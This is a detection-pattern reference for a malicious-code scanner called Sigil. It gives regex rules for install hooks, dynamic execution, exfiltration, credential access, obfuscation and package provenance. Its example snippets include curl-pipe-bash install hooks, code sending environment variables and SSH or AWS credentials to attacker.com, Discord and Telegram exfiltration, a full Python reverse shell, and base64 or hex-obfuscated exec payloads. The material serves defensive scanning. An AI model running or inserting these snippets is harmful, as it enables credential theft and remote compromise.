# Sigil Detection Patterns Reference

Compiled regex patterns, behavioral heuristics, and implementation notes for the Sigil malicious code scanner. This document provides production-ready patterns for each detection phase.

## Quick Reference

| Phase | Priority | Regex Patterns | File Types | Examples |
|-------|----------|---|-----------|----------|
| 1. Install Hooks | CRITICAL | cmdclass, lifecycle scripts | .py, .json, Makefile | setup.py, package.json, Gemfile |
| 2. Code Patterns | HIGH | eval/exec, pickle, ctypes | .py, .js, .rb, .rs | Dynamic execution detection |
| 3. Network | HIGH | webhook, socket, DNS | All | Discord, Telegram, ngrok |
| 4. Credentials | MEDIUM | env vars, API keys | All | AWS_SECRET, OPENAI_API_KEY |
| 5. Obfuscation | HIGH | base64, hex, JSO | All | Encoded payloads |
| 6. Provenance | LOW | metadata, git history | .json, git | Package metadata |

---

## Phase 1: Install Hooks (CRITICAL - 10x)

### Python setup.py Patterns

#### Rule 1.1.1: cmdclass Definition
```regex
cmdclass\s*=\s*{[^}]*(?:install|build|develop)
from\s+setuptools\.command\.(?:install|build|develop|bdist)
class\s+\w+\s*\(\s*(?:install|build|develop)\s*\)\s*:
```

**File:** setup.py, pyproject.toml

**Examples that trigger:**
```python
# Trigger 1: Direct cmdclass
cmdclass={'install': PostInstall}

# Trigger 2: Import + class definition
from setuptools.command.install import install
class PostInstall(install):

# Trigger 3: Entry point manipulation
setup(
    entry_points={'console_scripts': ['cmd = malicious:run']},
    include_package_data=True
)
```

#### Rule 1.1.2: Module-level Execution in setup.py
```regex
# Match file: setup.py with these patterns at module level (not in functions)
^(?!#|''').*(os\.system|os\.popen|subprocess\.|exec\(|eval\(|__import__|importlib\.)
```

**Severity:** CRITICAL

**Examples:**
```python
# setup.py
import subprocess
subprocess.run(['curl', 'https://evil.com/payload.sh', '|', 'bash'])  # CRITICAL

# setup.py with env exfil at top level
import os
requests.post('https://evil.com', json=dict(os.environ))  # CRITICAL
```

#### Rule 1.1.3: Makefile with Dangerous Install Target
```regex
# Makefile
^install:\s*$
(curl|wget|bash|sh|python|ruby)\s+
(|eval|exec|system)\s*\(
```

**Compound regex:**
```regex
(?m)^install:\s*\n.*(?:curl|wget|bash|sh|python|ruby).*(?:\||eval|exec|system)\s*\(
```

**Examples:**
```makefile
# Trigger: Installation hook with remote execution
install:
	curl -sSL https://evil.com/setup.sh | bash

# Trigger: wget + eval
install:
	@sh -c 'eval "$$(wget -O - https://evil.com/script.sh)"'
```

---

### Node.js/npm Patterns

#### Rule 1.2.1: Lifecycle Script Hooks
```regex
# package.json
"(preinstall|postinstall|preuninstall|install|prepare|build)"\s*:\s*"
```

**Severity:** CRITICAL

**Context matching:**
```json
{
  "scripts": {
    "preinstall": "DANGER",
    "postinstall": "DANGER",
    "preuninstall": "DANGER"
  }
}
```

**Examples triggering detection:**
```json
// Trigger 1: Direct script in hook
{
  "postinstall": "node -e 'require(\"child_process\").exec(\"curl https://evil.com/payload | bash\")'"
}

// Trigger 2: Reference to external file
{
  "preinstall": "node scripts/malicious.js"
}

// Trigger 3: Shell commands
{
  "prepare": "bash -c 'curl https://evil.com/setup.sh | sh'"
}
```

#### Rule 1.2.2: Child Process Execution in package.json Scripts
```regex
# Patterns inside script values:
(?:exec|spawn|fork|system|shell)\s*\(
\bchild_process\b
\bcurl\b.*\|\s*\b(bash|sh)\b
```

---

### Ruby Gem Patterns

#### Rule 1.3.1: Gem Extension Specification
```regex
# gemspec or Gemfile
\.extensions\s*=
ext/[^/]+\.rb
```

**Examples:**
```ruby
# Trigger: Malicious extension
Gem::Specification.new do |s|
  s.extensions = ['ext/setup.rb']  # DANGER
end

# Trigger: Extension path with system calls
File.write('ext/extconf.rb', "system('curl ... | bash')")
```

#### Rule 1.3.2: System Execution in Gem Build
```regex
# ext/extconf.rb or ext/setup.rb
^(?!#)(system|exec|Kernel\.exec|backticks)\s*\(
ruby_installer\s*=
wget|curl|bash
```

---

### Cargo (Rust) Patterns

#### Rule 1.4.1: Build Script Specification
```regex
# Cargo.toml
build\s*=\s*"build\.rs"
```

**Examples:**
```toml
# Trigger: Cargo.toml with build.rs
[package]
build = "build.rs"  # DANGER if build.rs is malicious
```

#### Rule 1.4.2: Unsafe FFI + Command Execution in build.rs
```regex
# build.rs
extern\s+"C"\s*{
Command::new\s*\(\s*["\'](?:curl|wget|bash|sh)
std::process::(Command|Child)
unsafe\s*{.*\}
```

---

## Phase 2: Code Patterns (HIGH - 5x)

### Python Code Execution

#### Rule 2.1.1: eval, exec, compile
```regex
\beval\s*\(
\bexec\s*\(
\bcompile\s*\(
\bcompile\s*\([^,]*,\s*['\"][^'\"]*['\"],
```

**Context matters:** These are HIGH severity in untrusted data flow, but not always malicious.

**Higher confidence if combined with:**
```regex
# Untrusted input sources:
request\.(args|form|json|data)
sys\.argv
input\(
raw_input\(
open\(.*\.read\(\)  # File-based code
```

**Examples:**
```python
# CRITICAL: eval with user input
eval(request.args.get('code'))  # Direct execution

# CRITICAL: exec with environment
exec(open('/tmp/payload.py').read())

# CRITICAL: compile + exec combination
code = request.form.get('script')
compiled = compile(code, '<string>', 'exec')
exec(compiled)
```

#### Rule 2.1.2: Dynamic Imports
```regex
__import__\s*\(
importlib\.import_module\s*\(
importlib\.util\.spec_from_file_location\s*\(
__getattr__\s*\(
getattr\s*\(\s*[^,]*,\s*['\"]__
```

**High severity when import name is user-controlled:**
```regex
# After untrusted source:
__import__\((?:[^)]*request\.|[^)]*environ|[^)]*argv)
```

#### Rule 2.1.3: os-level and subprocess Execution
```regex
os\.system\s*\(
os\.popen\s*\(
os\.execl\s*\(
subprocess\.call\s*\(.*shell\s*=\s*True
subprocess\.Popen\s*\(.*shell\s*=\s*True
subprocess\.run\s*\(.*shell\s*=\s*True
subprocess\.check_output\s*\(.*shell\s*=\s*True
```

**Examples triggering CRITICAL:**
```python
os.system(f'curl {url} | bash')
subprocess.Popen(user_input, shell=True)
subprocess.run('cmd', shell=True)
```

### Python Deserialization

#### Rule 2.2.1: Unsafe Pickle/Marshal
```regex
pickle\.loads\s*\(
pickle\.load\s*\(
marshal\.loads\s*\(
marshal\.load\s*\(
```

**HIGH severity when data source is remote:**
```regex
# Untrusted source detection:
pickle\.load\s*\(\s*(?:requests\.|urllib\.|socket\.)
pickle\.loads\s*\(\s*\.(?:content|text|get\()
```

**Examples:**
```python
# CRITICAL: Pickle from remote
data = requests.get('https://attacker.com/payload.pkl').content
obj = pickle.loads(data)  # RCE via __reduce__

# CRITICAL: Marshal from file
with open('data.pkl', 'rb') as f:
    code = marshal.load(f)
    exec(code)
```

#### Rule 2.2.2: YAML Unsafe Load
```regex
yaml\.load\s*\([^,]*\)(?!.*Loader)  # load() without Loader arg
yaml\.unsafe_load\s*\(
yaml\.full_load\s*\(  # Deprecated, can be unsafe
```

**Safe patterns (should not flag):**
```regex
yaml\.load\s*\([^,]*,\s*Loader\s*=\s*yaml\.SafeLoader
yaml\.safe_load\s*\(
```

### JavaScript Code Execution

#### Rule 2.3.1: Function Constructor & eval
```regex
new\s+Function\s*\(
Function\s*\(\s*['\"]
eval\s*\(
```

**Context matters:**
```regex
# High risk when combined with:
new\s+Function\s*\(\s*(?:Buffer|atob|payload|code|encoded)
Function\s*\(\s*(?:request\.|process\.env|require\()
eval\s*\(\s*(?:atob|Buffer\.from|JSON\.parse)
```

#### Rule 2.3.2: Child Process Execution
```regex
require\s*\(\s*['\"]child_process
child_process\.exec\s*\(
child_process\.spawn\s*\(
child_process\.fork\s*\(
execSync\s*\(
spawnSync\s*\(
```

**Examples:**
```javascript
// CRITICAL
const { exec } = require('child_process');
exec('curl https://evil.com/steal | bash');

// CRITICAL
const cp = require('child_process');
cp.spawn('cmd', ['/c', 'powershell IEX(New-Object Net.WebClient).DownloadString(...)']);
```

#### Rule 2.3.3: VM Module Execution
```regex
vm\.runInContext\s*\(
vm\.runInNewContext\s*\(
vm\.runInThisContext\s*\(
vm\.createContext\s*\(
require\s*\(\s*['\"]vm
new\s+vm\.Script\s*\(
```

### Ruby Code Execution

#### Rule 2.4.1: eval and system
```regex
\beval\s*\(|eval\s+['\"]
\bsystem\s*\(|system\s+['\"]
\bexec\s*\(
\bsystem\s*\(\s*['\"]
Kernel\.exec\s*\(
IO\.popen\s*\(
backticks\s+.*[|]
```

### Rust FFI & Unsafe Patterns

#### Rule 2.5.1: Unsafe Code with System Calls
```regex
unsafe\s*{.*\}
extern\s+"C"\s*{
libc::\w+
#\[link\s*\(.*\)\]
```

**CRITICAL if combined with:**
```regex
unsafe\s*{[^}]*(?:system|exec|popen|Command::new)
```

---

## Phase 3: Network & Exfiltration (HIGH - 3x)

### HTTP Exfiltration Patterns

#### Rule 3.1.1: HTTP Request with Environment Variable Data
```regex
# Python
requests\.(post|put|patch)\s*\(
urllib.*urlopen
http\.client\.HTTPConnection
aiohttp\.(ClientSession|post)
```

**CRITICAL if combined with:**
```regex
requests\.(post|put)\s*\([^)]*(?:os\.environ|sys\.argv|subprocess\.check_output)
(requests|urllib)\..*\(\s*['\"].*\?.*['\"].*json\s*=
```

**Examples triggering CRITICAL:**
```python
# Stealing environment
requests.post('https://evil.com/collect', json=dict(os.environ))

# Stealing cloud credentials
data = open(os.path.expanduser('~/.aws/credentials')).read()
requests.post('https://attacker.com/steal', data=data)

# Exfil with urllib
urllib.request.urlopen('https://attacker.com/collect?env=' + str(os.environ))
```

#### Rule 3.1.2: Fetch & XMLHttpRequest (JavaScript)
```regex
fetch\s*\(
XMLHttpRequest
axios\.(post|put|patch|request)
```

**Context for HIGH severity:**
```regex
fetch\s*\(['\"][^'\"]*attacker|evil|tunnel['\"]
fetch.*\(\s*(?:process\.env|document\.cookie|fetch.*credentials)
XMLHttpRequest.*send\s*\(\s*[^)]*(?:env|secret|token|password)
```

### Discord Webhook Exfiltration

#### Rule 3.2.1: Discord Webhook Patterns
```regex
discord\.com/api/webhooks/\d+/[\w-]+
discordapp\.com/api/webhooks
https?://.*discord.*webhook
webhook.*=.*discord
webhook.*=.*['\"]https://[^'\"]*discord
```

**CRITICAL in combination with:**
```regex
(?:discord.*webhook|webhook.*discord).*(?:os\.environ|process\.env|secrets|credentials|AWS_|OPENAI_|GITHUB_)
```

**Examples:**
```python
# CRITICAL: Discord webhook with credential theft
import requests
webhook = 'https://discord.com/api/webhooks/1234567890/abcdef'
secrets = {k: v for k, v in os.environ.items() if 'KEY' in k or 'SECRET' in k}
requests.post(webhook, json={'content': str(secrets)})
```

### Telegram Bot Exfiltration

#### Rule 3.2.2: Telegram Bot Patterns
```regex
api\.telegram\.org/bot
send(Message|Document|Photo|Video|File)
bot_token\s*=\s*['\"][\w:_-]+['\"]
chat_id\s*=
telegram\.(org|com).*api
```

**Examples:**
```python
# CRITICAL: Telegram C2 with file exfiltration
bot_token = '1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'
chat_id = '-1001234567890'

# Send SSH keys
with open(os.path.expanduser('~/.ssh/id_rsa'), 'rb') as f:
    requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument',
        files={'document': f}, data={'chat_id': chat_id})
```

### Raw Socket & Reverse Shell Patterns

#### Rule 3.3.1: Socket Programming
```regex
socket\.socket\s*\(\s*(?:socket\.AF_INET|AF_INET)
socket\.connect\s*\(
socket\.bind\s*\(
socket\.listen\s*\(
dup2\s*\(\s*\w+\.fileno\s*\(\),\s*[012]\s*\)
```

**CRITICAL for reverse shells:**
```regex
(?:socket|s)\.connect\s*\(\s*['\"](?:[a-z0-9\-]+\.)+[a-z]{2,}['\"]
os\.dup2\s*\(\s*\w+\.fileno\s*\(\)\s*,\s*[012]\s*\).*subprocess\.(Popen|call).*bash
```

**Example (reverse shell):**
```python
# CRITICAL: Reverse shell via socket
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr
subprocess.Popen(['/bin/bash', '-i'])
```

#### Rule 3.3.2: DNS Tunneling
```regex
socket\.getaddrinfo\s*\(
socket\.gethostbyname\s*\(
socket\.gethostbyaddr\s*\(
dns\.(query|resolve|lookup)
```

**CRITICAL if combined with:**
```regex
(?:getaddrinfo|gethostbyname|dns\.query).*(?:base64|b64|hex|encode|chunk)
```

### ngrok & localtunnel Patterns

#### Rule 3.4.1: Tunneling Services
```regex
\bngrok\b
\blt\b\s+--port
localtunnel
ngrok\.(com|io)
```

**CRITICAL usage:**
```regex
subprocess\.\w+\s*\(\s*['\"]ngrok
(ngrok|lt)\s+(?:tcp|http|start)
```

---

## Phase 4: Credentials (MEDIUM - 2x)

### Environment Variable Access

#### Rule 4.1.1: Credential-bearing Environment Variables
```regex
AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_SESSION_TOKEN
OPENAI_API_KEY|ANTHROPIC_API_KEY
GITHUB_TOKEN|GH_TOKEN
DATABASE_URL|DB_PASSWORD|DB_SECRET
STRIPE_KEY|STRIPE_SECRET
SLACK_TOKEN|SLACK_BOT_TOKEN
PRIVATE_KEY|SSH_KEY|RSA_KEY
API_KEY|API_SECRET|SECRET_KEY
JWT_SECRET|AUTH_TOKEN
MAILGUN_KEY|SENDGRID_KEY
POSTGRES.*PASSWORD|MYSQL.*PASSWORD
```

**Context matching (HIGH severity):**
```regex
os\.environ\s*\[[\'\"](?:AWS_SECRET|OPENAI_API_KEY|GITHUB_TOKEN)
os\.environ\.get\s*\(\s*['\"](?:AWS_SECRET|DB_PASSWORD|API_KEY)
process\.env\.(?:AWS_SECRET|OPENAI|GITHUB|STRIPE)
env\s*\[[\'\"](?:PRIVATE_KEY|API_SECRET)
```

**Examples:**
```python
# Medium-risk: Just accessing environment variable
api_key = os.environ.get('OPENAI_API_KEY')

# HIGH-risk: Accessing + exfiltrating
key = os.environ['OPENAI_API_KEY']
requests.post('https://attacker.com/collect', json={'key': key})

# HIGH-risk: Broad credential theft
secrets = {k: v for k, v in os.environ.items() if 'KEY' in k or 'SECRET' in k}
```

### File-based Credential Access

#### Rule 4.2.1: SSH Key File Access
```regex
~?/?\.ssh/(?:id_rsa|id_ed25519|id_ecdsa|authorized_keys)
open\s*\(\s*['\"].*\.ssh/
os\.path\.expanduser\s*\(\s*['\"]~/.ssh
glob\.glob\s*\(\s*['\"].*\.ssh
```

#### Rule 4.2.2: Cloud Credential Files
```regex
~?/?\.aws/(?:credentials|config)
~?/?\.config/gcloud
~?/?\.kube/config
~?/?\.docker/config\.json
~?/?\.azure/
```

#### Rule 4.2.3: Database/Service Credentials
```regex
~?/?\.psql_history
~?/?\.mysql_history
~?/?\.pgpass
~?/?\.env(?:\.local|\.production)
config\.json.*(?:password|secret|key|token)
```

### Browser Credential Theft

#### Rule 4.3.1: Browser Database Access
```regex
~?/?\.config/google-chrome/Default/(?:Login Data|Cookies)
~?/?\.mozilla/firefox/.*profile
~?/?\.config/chromium
Library/Application Support/Google/Chrome
Local/Google/Chrome
```

### Keyring & Password Manager Access

#### Rule 4.4.1: System Credential Store
```regex
keyring\.get_password
SecureString\(
Credential\.GetNetworkCredential
osascript.*security.*find-generic-password
security\s+find-generic-password
```

---

## Phase 5: Obfuscation (HIGH - 5x)

### Base64 Encoding & Decoding

#### Rule 5.1.1: Base64 Decode Patterns
```regex
# Python
base64\.b64decode\s*\(
base64\.decodebytes\s*\(
base64\.a85decode\s*\(

# JavaScript
atob\s*\(
Buffer\.from\s*\([^)]*[,\s]+['\"]base64['\"]
Buffer\.from\s*\(['\"].*['\"][,\s]+['\"]base64['\"]
```

**CRITICAL if combined with execution:**
```regex
# Python: decode + execute
(?:exec|eval)\s*\(\s*(?:base64\.b64decode|base64\.decodebytes)
base64\.b64decode\s*\(\s*['\"][\w+/]+=*['\"].*\s*\)\s*(?:\.|\.decode|,)

# JavaScript: atob + eval
(?:eval|Function)\s*\(\s*(?:atob|Buffer\.from)
atob\s*\(\s*['\"][A-Za-z0-9+/]+=*['\"]
```

**Examples (CRITICAL):**
```python
# CRITICAL: Base64 payload + exec
import base64
payload = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cHM6Ly9ldmlsLmNvbSIp')
exec(payload)

# CRITICAL: Combined decode/execute
exec(base64.b64decode(os.environ.get('PAYLOAD')))
```

### Hex Encoding & Unicode Escapes

#### Rule 5.2.1: Hex String Literals
```regex
# Hex escape sequences (\xNN)
\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2})+
\\x[0-9a-fA-F]{2}.*\\x[0-9a-fA-F]{2}  # Multiple hex escapes

# Unicode escapes (\uNNNN)
\\u[0-9a-fA-F]{4}
\\U[0-9a-fA-F]{8}
```

**Combined with execution (CRITICAL):**
```regex
(?:exec|eval|os\.system)\s*\(\s*['\"]\\x[0-9a-fA-F]{2}
```

**Examples:**
```python
# CRITICAL: Hex-encoded command execution
cmd = '\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d'  # curl https://evil.com
os.system(cmd)

# CRITICAL: Mixed encoding
exec('\x65\x78\x65\x63' + '(base64.b64decode("..."))')
```

### Character Code Construction

#### Rule 5.3.1: String from Character Codes (JavaScript)
```regex
String\.fromCharCode\s*\(
charCodeAt\s*\(
\.split\s*\(\s*['\']['\"]?\)\s*\.map\s*\(\s*[^)]*charCode
```

**CRITICAL patterns:**
```regex
String\.fromCharCode\s*\(\s*\d+\s*(?:,\s*\d+)+\s*\)
\[\s*\d+\s*(?:,\s*\d+)+\s*\]\.map\s*\(\s*[^)]*String\.fromCharCode
```

**Examples:**
```javascript
// CRITICAL: Character code execution
const fn = String.fromCharCode(101, 118, 97, 108);  // 'eval'
window[fn]('fetch("https://attacker.com/steal?env=" + JSON.stringify(process.env))');

// CRITICAL: Array of codes
const codes = [102, 101, 116, 99, 104];  // 'fetch'
eval(String.fromCharCode(...codes) + '(...)');
```

### JavaScript Obfuscator Detection

#### Rule 5.4.1: JSO Output Patterns
```regex
# Variable naming pattern
var\s+_0x[a-f0-9]{4}\s*=\s*\[
_0x[a-f0-9]{4}\[_0x[a-f0-9]{4}\s*\(\s*['\"]0x
_0x[a-f0-9]{4}\('\w+'\)\s*!==\s*undefined

# String array extraction pattern
\['push'\]\(|'\]='push|'shift'\]\(|splice.*rotate

# Control flow flattening
switch\s*\(\s*_0x[a-f0-9]{4}
case\s+['\"]0x[a-f0-9]+['\"]
```

**Combined metrics (HIGH confidence if multiple trigger):**
- Variable name pattern `_0x[a-f0-9]{4,8}`
- String array with bracket indexing
- Large minified JavaScript (>100KB)
- Low entropy + high compression ratio

### String Concatenation & Dead Code

#### Rule 5.5.1: Suspicious Concatenation
```regex
# Multiple concatenations of short strings
['\"][a-z]{1,3}['\"]\\s*\+\\s*['\"][a-z]{1,3}['\"].*\+.*\+.*\+
\('im'\s*\+\s*'port'\s*\+\s*'lib'\)

# Ternary operator heavy usage (control flow obfuscation)
[?:]\s*['\"][a-z]+['\"]\s*:['\"][a-z]+['\"].*[?:]\s*
```

**Examples:**
```python
# CRITICAL: Concatenation of imports
z = "im" + "port" + " os"
exec(z)

# CRITICAL: Buried in branches
x = 1 + 1  # dead code
y = 2 * 2  # dead code
z = "im" + "port" + " os"  # real code
exec(z)
```

---

## Phase 6: Provenance (LOW - 1-3x)

### Package Metadata Red Flags

#### Rule 6.1.1: Suspicious Version Numbers
```regex
# Version 0.0.0
"version"\s*:\s*"0\.0\.0"

# Suspiciously high version
"version"\s*:\s*"(?:\d{3,}|999|1000)\.

# Rapid version increments in package history
v\d+\.\d+\.\d+.*v\d+\.\d+\.\d+.*within.*minutes|hours
```

#### Rule 6.1.2: Missing or Minimal Metadata
```regex
# No description
"description"\s*:\s*""

# Generic description
"description"\s*:\s*"(?:a|an|the)\s+(?:library|package|module|tool)"

# Missing author or invalid email
"author"\s*:\s*(?:""|\{\s*\})
"author".*@[a-z0-9]+\.[a-z]{2,}(?:\.[a-z]{2,})?"\s*[,}]  # Recently re-registered domain

# No repository
"repository"\s*:\s*(?:""|\{\s*\})
```

#### Rule 6.1.3: Suspicious Author Domain
```regex
# Defunct or high-risk domains
@(?:aol|hotmail|gmail|yahoo|temporary-mail|10minutemail)\.
@fake|@test|@example|@localhost
@attacker|@malicious|@evil|@hacker
```

### Git History Analysis

#### Rule 6.2.1: Shallow Repository
```bash
# Detect via git command
git rev-list --count HEAD  # < 3 commits = suspicious
git log --format=%aE | sort -u | wc -l  # Count of unique authors < 2 = suspicious
```

**Implementation note:** Execute via Sigil CLI, not regex

### Binary & Executable Files

#### Rule 6.3.1: Embedded Binaries
```bash
# File magic detection
file <file> | grep -E 'ELF|Mach-O|PE32|executable|shared object'

# Common binary locations
dist/*.so
dist/*.dll
build/*.exe
lib/*.dylib
```

**Regex patterns for suspicious binary references:**
```regex
\.so$|\.dll$|\.exe$|\.dylib$
binary|executable|elf|mach-o|pe32
artifact|build.*output.*binary
```

### Large Files & Payloads

#### Rule 6.4.1: Oversized Files
```bash
# Files > 1MB (excluding .git, node_modules)
find . -size +1M -not -path './.git/*' -not -path '*/node_modules/*' -type f
```

**Regex patterns:**
```regex
# File size in metadata
"size"\s*:\s*"(?:[1-9][0-9]{7,}|[1-9][0-9]{6,}[0-9]{3,})"

# In package.json, tarball info
"tarball".*size['\"]?\s*:\s*(?:[1-9][0-9]{7,})
```

### Hidden & Suspicious Files

#### Rule 6.5.1: Hidden File Patterns
```regex
# Hidden files (excluding standard ones)
^\.(?!git|gitignore|env\.example|eslintrc|prettierrc|editorconfig|js-beautifyrc|babelrc|npmrc|nvmrc|dockerignore|github)
^\.(?:secret|backdoor|payload|malware|dropper|c2)
```

**Standard/Safe hidden files to exclude:**
- `.git`, `.gitignore`, `.gitattributes`
- `.env.example`, `.env.local` (if documented)
- `.eslintrc*`, `.prettierrc*`, `.editorconfig`
- `.npmrc`, `.nvmrc`, `.dockerignore`
- `.github`, `.gitlab-ci.yml`, `.circleci`

---

## API Key Regex Patterns (Phase 4)

### Production-Ready API Key Signatures

```regex
# AWS
(?:AKIA|AIDA|AIRA|ASIA)[0-9A-Z]{16}
aws_secret_access_key\s*=\s*['\"][\w/+]{40}['\"]

# OpenAI
sk-[a-zA-Z0-9]{48}|sk-[a-zA-Z0-9]{20,}

# Anthropic
sk-ant-[a-zA-Z0-9_-]{20}[a-zA-Z0-9]{180}

# GitHub
ghp_[a-zA-Z0-9]{36,255}
gho_[a-zA-Z0-9]{36,255}
github_token\s*=\s*['\"][\w_\-]{40,}['\"]

# Stripe
sk_(?:test|live)_[a-zA-Z0-9]{24,}

# SendGrid
SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}

# Slack
xox[abp]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*

# Mailgun
key-[a-zA-Z0-9]{32}

# MongoDB
mongodb\+srv://[\w\-]+:[\w\-!@#$%^&*()+=]+@

# Twilio
AC[a-zA-Z0-9]{32}

# Google Cloud
"type"\s*:\s*"service_account".*"private_key"
AIza[0-9A-Za-z\-_]{35}

# Heroku
Bearer\s+[a-zA-Z0-9_\-]{40,}

# JWTs
eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+
```

---

## Implementation Notes

### Performance Optimization

1. **Pre-compile Regexes:** Compile regex patterns at scanner initialization
2. **Order of Execution:** Check highest-severity patterns first
3. **Early Exit:** Stop scanning file on CRITICAL finding
4. **Caching:** Cache compiled patterns per file type

### False Positive Reduction

1. **Context Analysis:** Combine multiple patterns for HIGH confidence
2. **Filtering:** Exclude comments, documentation, test files
3. **Allowlisting:** Maintain list of known-safe patterns
4. **Manual Review:** Flag MEDIUM findings for human review

### Multi-language Support

- **Python:** .py, .pyx, setup.py, pyproject.toml
- **JavaScript:** .js, .mjs, .cjs, .jsx, .ts, .tsx
- **Ruby:** .rb, .gemspec, Gemfile
- **Rust:** .rs, Cargo.toml, build.rs
- **Go:** .go, go.mod, go.sum
- **Java:** .java, pom.xml, build.gradle

---

## References

This document is part of the Sigil malicious code detection suite. For detailed threat intelligence and real-world examples, see `malicious-signatures.md`.

For implementation in the Sigil scanner, patterns should be:
1. Compiled into detection rule definitions
2. Weighted by severity (10x, 5x, 3x, 2x, 1x)
3. Tested against known malicious packages
4. Updated as new threats emerge
